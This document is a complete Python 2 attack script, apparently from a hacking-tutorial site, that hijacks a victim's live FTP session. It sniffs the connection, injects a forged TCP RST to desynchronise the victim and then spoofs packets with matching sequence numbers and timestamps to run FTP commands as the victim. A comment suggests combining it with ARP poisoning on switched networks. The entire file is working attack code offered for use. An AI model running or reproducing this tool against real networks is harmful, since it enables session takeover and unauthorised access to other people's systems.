#!/usr/bin/python
#
# Simple IP Spoofing via RST Hijacking for FTP
# By François GOICHON
# www.bases-hacking.org

import dpkt, pcap
import random

# Some aliases to make life easier
Loopback = dpkt.loopback.Loopback
Ethernet = dpkt.ethernet.Ethernet
IP = dpkt.ip.IP
TCP = dpkt.tcp.TCP
ACK = dpkt.tcp.TH_ACK
SYN = dpkt.tcp.TH_SYN
FIN = dpkt.tcp.TH_FIN
RST = dpkt.tcp.TH_RST

def bytesToIPstr(bytes):
   return '.'.join( [ "%d" % ord(x) for x in bytes  ])

def IPstrTobytes(str):
   return ''.join( [ "%c" % int(x) for x in str.split(".") ] )
      
def bytesToInt(bytes):
   res=0
   for i in range(0,4):
      res = res + (ord(bytes[i]) << ((3-i) << 3))
   return res

def intToBytes(nb):
   bytes=""
   for i in range(0,4):
      bytes = bytes + "%c" % ((nb >> ((3-i) << 3)) & 0xff)
   return bytes

def tcp_inject_rst(pc,template,control_nums):

   # Setting control numbers
   template.ip.id = random.randint(10000,15000)
   template.ip.tcp.seq = control_nums[0]
   template.ip.tcp.ack = control_nums[1]

   # Window size=0, resetting TCP offset
   template.ip.tcp.win = 0
   template.ip.tcp.off_x2 = ((5 << 4) | 0)

   # Injecting RST
   template.ip.tcp.flags = RST

   # Deleting extra data
   diff = len(template.ip.tcp.data) + len(template.ip.tcp.opts)
   template.ip.len = template.ip.len - diff
   template.ip.tcp.data = ""
   template.ip.tcp.opts = ""

   # Resetting checksums
   template.ip.sum=0
   template.ip.tcp.sum=0

   # Injecting
   pc.inject(str(template),60)

def tcp_inject_data(pc,template,control_nums,timestamps,data=""):

   # Setting right control numbers
   template.ip.id = control_nums[0]
   template.ip.tcp.seq = control_nums[1]
   template.ip.tcp.ack = control_nums[2]

   # Setting TCP timestamps
   if len(template.ip.tcp.opts) != 0:
      template.ip.tcp.opts = "\x01\x01\x08\x0a" + timestamps[0] + timestamps[1]

   # Assuming no data is an ack
   orig_flags = template.ip.tcp.flags
   if data == "":
      template.ip.tcp.flags=ACK

   # Replacing TCP data
   diff = len(template.ip.tcp.data) - len(data)
   template.ip.len = template.ip.len - diff
   template.ip.tcp.data = data

   # Resetting checksums
   template.ip.sum=0
   template.ip.tcp.sum=0

   # Injecting
   pkt_str = str(template)
   pc.inject(pkt_str,len(pkt_str))

   template.ip.tcp.flags=orig_flags

import time

def get_resp(pc,template,control_nums,timestamps,data):

   # Generate new local timestamp
   if len(template.ip.tcp.opts) != 0:
      timestamps[0] = intToBytes(bytesToInt(timestamps[0]) + 1 + int((time.time() - timestamps[1])*100))
      timestamps[1] = time.time()

   # Increment IP id
   control_nums[0] = control_nums[0] + 1

   # Inject cmd
   tcp_inject_data(pc,template,control_nums,[timestamps[0],timestamps[2]],data)

   decode = { pcap.DLT_LOOP:Loopback,
              pcap.DLT_NULL:Loopback,
              pcap.DLT_EN10MB:Ethernet }[pc.datalink()]

   # Wait for the reply
   for ts,pkt in pc:
      tcp = decode(pkt).ip.tcp
      if tcp.data == "":
         continue

      # Keep track of new control numbers & timestamps
      timestamps[2] = tcp.opts[4:8]
      control_nums[0] = control_nums[0] + 1
      control_nums[1] = tcp.ack
      control_nums[2] = tcp.seq+len(tcp.data)

      # Generate new local timestamp
      if len(template.ip.tcp.opts) != 0:
         timestamps[0] = intToBytes(bytesToInt(timestamps[0]) + 1 + int((time.time() - timestamps[1])*100))
         timestamps[1] = time.time()

      tcp_inject_data(pc,template,control_nums,[timestamps[0],timestamps[2]])

      return (tcp.data,control_nums,timestamps)


def sniff(interface,victim,hijacked_port):

   pc = pcap.pcap(interface)

   # To sniff the victim's packet, the network shouldn't be switched or traffic hijacking techniques (e.g. ARP poisoning) should be used in parallel

   # Process only packets from and to the victim with hijacked_port as remote port
   pc.setfilter("( ip src " + victim + " and tcp dst port " + str(hijacked_port) + " ) or ( ip dst " + victim + " and tcp src port " + str(hijacked_port) + " )")
   decode = { pcap.DLT_LOOP:Loopback,
              pcap.DLT_NULL:Loopback,
              pcap.DLT_EN10MB:Ethernet }[pc.datalink()]

   remote=None
   template_pkt=None
   template_cmd=None

   # Processing loop
   for ts, pkt in pc:

      # We know filtered packets are TCP only
      ip = decode(pkt).ip
      tcp = ip.tcp

      flags = tcp.flags
      if flags & SYN == 0 and flags & FIN == 0 and flags & RST == 0:
         src = bytesToIPstr(ip.src)
         dst = bytesToIPstr(ip.dst)

         if remote == None: # Not attached yet
            print "Active connection from " + src + " to " + dst + " on port " + str(hijacked_port)
            if src == victim:
               remote = dst 
            else:
               remote = src

         if remote == src:
            template_pkt=decode(pkt)
            last_tsecr = tcp.opts[4:8]
         elif remote == dst:
            if len(tcp.data) != 0:
               template_cmd = decode(pkt)
            last_ack=int(tcp.ack)
            last_seq=int(tcp.seq)
            last_len = len(tcp.data)
            last_id = int(ip.id)
            last_tval = tcp.opts[4:8]
            last_timestamp = time.time()
            if template_pkt != None and template_cmd != None:
               #time.sleep(0.5)
               #try pc.next() (need to change the current for loop) -> Cf. pydoc pcap
               break

   # Now doing the job
   if last_len==0:
      last_len=1


# RST Hijacking
# Ack last recvd packet (seq+last_len) to reduce retransmission prob.
   print "RST Hijacking... ",
   tcp_inject_rst(pc,template_pkt,(last_ack,last_seq+last_len))
   print "done.\n"

   # Ignore the packets sent by the victim
   victim_port = template_cmd.ip.tcp.sport
   pc.setfilter("ip src " + remote + " and tcp dst port " + str(victim_port) + " and tcp src port " + str(hijacked_port))

   print "\nNow impersonating " + victim + ":" + str(victim_port) + " in its connection to " + remote + ":" + str(hijacked_port)

   # Injecting a legal packet to finalize the victim's desynchronization
   input = "CWD /"

   print "ftp> " + input

   exit_keys=("bye","quit","exit")
   while input.lower() not in exit_keys:
      input = input.strip("\n") + "\r\n"

      (data,[last_id,last_seq,last_ack],[last_tval,last_timestamp,last_tsecr]) = get_resp(pc,template_cmd,[last_id,last_seq,last_ack],[last_tval,last_timestamp,last_tsecr],input)
      print data

      input = raw_input("ftp> ")
    

import sys, getopt
import ctypes, os

def usage():
    print >> sys.stderr, 'Usage: %s [-i <device>] -t <target ip> -p <hijacked port>' % sys.argv[0]
    sys.exit(1)

def main():
   interface=None
   victim=None
   hijacked_port=0

   # Seed the random number generator with current timestamp
   random.seed()

   try:
      opts, args = getopt.getopt(sys.argv[1:], 'i:t:p:h')
   except getopt.GetoptError:
      usage()

   for o, a in opts:
      if o == '-i': interface = a
      elif o == '-t': victim = a
      elif o == '-p': hijacked_port = int(a)
      else: usage() 

   if victim == None or hijacked_port <= 0 or hijacked_port > 65535:
      usage()

   # Do we have admin privs ?
   try: # Unix
      is_admin = (os.getuid() == 0)
   except: # Windows >= 2000
      is_admin = ctypes.windll.shell32.IsUserAnAdmin()

   if is_admin == False:
      print "You must have administrator privileges to operate at low network layers level"
      sys.exit(1)

   sniff(interface,victim,hijacked_port)

if __name__ == '__main__':
    main()

